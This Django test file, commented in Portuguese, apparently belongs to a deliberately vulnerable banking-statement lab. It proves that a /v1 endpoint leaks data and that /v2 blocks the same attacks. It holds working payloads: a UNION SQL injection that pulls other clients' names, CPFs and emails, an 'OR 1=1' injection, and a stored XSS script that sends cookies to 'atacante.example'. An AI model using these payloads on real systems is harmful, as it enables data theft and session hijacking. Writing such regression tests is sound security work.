"""Exploração no /v1 e bloqueio no /v2, contra PostgreSQL de verdade.

Os dados vêm da migração de dados simulados: Ana na conta 100, Bruno na 200.
"""

import base64
import hashlib
import hmac
import json
import time

from django.conf import settings
from django.test import TestCase

from .autenticacao import ler_token


def token(cliente_id: int, perfil: str = "CLIENTE", validade: int = 900) -> str:
    conteudo = base64.urlsafe_b64encode(f"{cliente_id}:{perfil}:{int(time.time()) + validade}".encode()).rstrip(b"=")
    assinatura = hmac.new(settings.BRECHA_SEGREDO, conteudo, hashlib.sha256).digest()
    return "Bearer " + conteudo.decode() + "." + base64.urlsafe_b64encode(assinatura).rstrip(b"=").decode()


ANA = token(1)
BRUNO = token(2)

# Fecha a aspa da busca e junta os clientes ao extrato. As colunas casam em
# tipo com as do SELECT original: data, texto e número.
UNION = "zzz' UNION SELECT CURRENT_DATE, nome || ' | ' || cpf || ' | ' || email, conta FROM extrato_cliente --"

# Comenta o resto da linha, inclusive o % que vem depois da busca: sobra
# "(conta = 100 AND descricao ILIKE '%') OR 1=1", verdadeiro para toda linha.
SEMPRE_VERDADE = "' OR 1=1 --"

XSS = "<script>fetch('https://atacante.example/?c='+document.cookie)</script>"


class AutenticacaoTest(TestCase):
    def test_sem_token_ou_com_token_forjado_ou_vencido_responde_401(self):
        vencido = token(1, validade=-1)
        conteudo = base64.urlsafe_b64encode(b"2:CLIENTE:9999999999").rstrip(b"=").decode()
        forjado = "Bearer " + conteudo + "." + base64.urlsafe_b64encode(b"x" * 32).rstrip(b"=").decode()
        for versao in ("v1", "v2"):
            for cabecalho in (None, "Bearer lixo", vencido, forjado):
                extra = {"HTTP_AUTHORIZATION": cabecalho} if cabecalho else {}
                resposta = self.client.get(f"/{versao}/extrato", **extra)
                self.assertEqual(resposta.status_code, 401, (versao, cabecalho))

    def test_token_valido_da_ana(self):
        self.assertEqual(ler_token(ANA).cliente_id, 1)


class Brecha013SqlInjectionTest(TestCase):
    def test_v1_union_traz_nome_cpf_e_email_de_todos_os_clientes(self):
        resposta = self.client.get("/v1/extrato", {"busca": UNION}, HTTP_AUTHORIZATION=ANA)
        self.assertEqual(resposta.status_code, 200)
        descricoes = [item["descricao"] for item in resposta.json()["lancamentos"]]
        self.assertIn("Bruno Lima | 111.444.777-35 | bruno@exemplo.com.br", descricoes)
        self.assertEqual(len(descricoes), 3)

    def test_v1_condicao_sempre_verdadeira_mostra_a_conta_do_bruno(self):
        resposta = self.client.get("/v1/extrato", {"busca": SEMPRE_VERDADE}, HTTP_AUTHORIZATION=ANA)
        descricoes = [item["descricao"] for item in resposta.json()["lancamentos"]]
        self.assertIn("Venda de bicicleta", descricoes)

    def test_v2_trata_a_busca_como_texto(self):
        # Curto o bastante para passar pelo limite de tamanho: o que barra é o
        # ORM, que manda a busca como parâmetro.
        resposta = self.client.get("/v2/extrato", {"busca": SEMPRE_VERDADE}, HTTP_AUTHORIZATION=ANA)
        self.assertEqual(resposta.status_code, 200)
        self.assertEqual(resposta.json()["lancamentos"], [])

    def test_v2_recusa_o_union_pelo_tamanho_antes_de_chegar_ao_banco(self):
        resposta = self.client.get("/v2/extrato", {"busca": UNION}, HTTP_AUTHORIZATION=ANA)
        self.assertEqual(resposta.status_code, 400)

    def test_v2_mostra_so_a_conta_de_quem_pediu(self):
        resposta = self.client.get("/v2/extrato", HTTP_AUTHORIZATION=ANA)
        descricoes = [item["descricao"] for item in resposta.json()["lancamentos"]]
        self.assertEqual(descricoes, ["Salário de outubro", "Aluguel"])

    def test_v2_recusa_busca_longa(self):
        resposta = self.client.get("/v2/extrato", {"busca": "a" * 51}, HTTP_AUTHORIZATION=ANA)
        self.assertEqual(resposta.status_code, 400)


class Brecha014XssArmazenadoTest(TestCase):
    def setUp(self):
        # O Bruno transfere para a Ana e escreve a descrição; a API principal
        # avisa este serviço pela rota interna.
        resposta = self.client.post(
            "/interno/lancamentos",
            data=json.dumps({"conta": 100, "data": "2026-10-20", "descricao": XSS, "valorCentavos": 100}),
            content_type="application/json",
            HTTP_X_TOKEN_DE_SERVICO=settings.TOKEN_DE_SERVICO,
        )
        self.assertEqual(resposta.status_code, 201)

    def test_v1_entrega_o_script_do_bruno_no_extrato_da_ana(self):
        resposta = self.client.get("/v1/extrato.html", HTTP_AUTHORIZATION=ANA)
        self.assertContains(resposta, XSS, html=False)
        self.assertNotIn("Content-Security-Policy", resposta.headers)

    def test_v2_escapa_a_descricao_e_proibe_script_pela_csp(self):
        resposta = self.client.get("/v2/extrato.html", HTTP_AUTHORIZATION=ANA)
        self.assertNotContains(resposta, "<script>", html=False)
        self.assertContains(resposta, "&lt;script&gt;", html=False)
        self.assertIn("default-src 'none'", resposta.headers["Content-Security-Policy"])
        self.assertEqual(resposta.headers["X-Frame-Options"], "DENY")


class RotaInternaTest(TestCase):
    def test_sem_token_de_servico_nao_registra(self):
        corpo = json.dumps({"conta": 100, "data": "2026-10-20", "descricao": "x", "valorCentavos": 1})
        for cabecalho in ({}, {"HTTP_X_TOKEN_DE_SERVICO": "errado"}):
            resposta = self.client.post("/interno/lancamentos", data=corpo, content_type="application/json", **cabecalho)
            self.assertEqual(resposta.status_code, 401)

    def test_lancamento_invalido_responde_400(self):
        for corpo in ("{", json.dumps({"conta": "x"}), json.dumps({"conta": 1, "data": "ontem", "descricao": "a", "valorCentavos": 1})):
            resposta = self.client.post(
                "/interno/lancamentos", data=corpo, content_type="application/json",
                HTTP_X_TOKEN_DE_SERVICO=settings.TOKEN_DE_SERVICO,
            )
            self.assertEqual(resposta.status_code, 400, corpo)
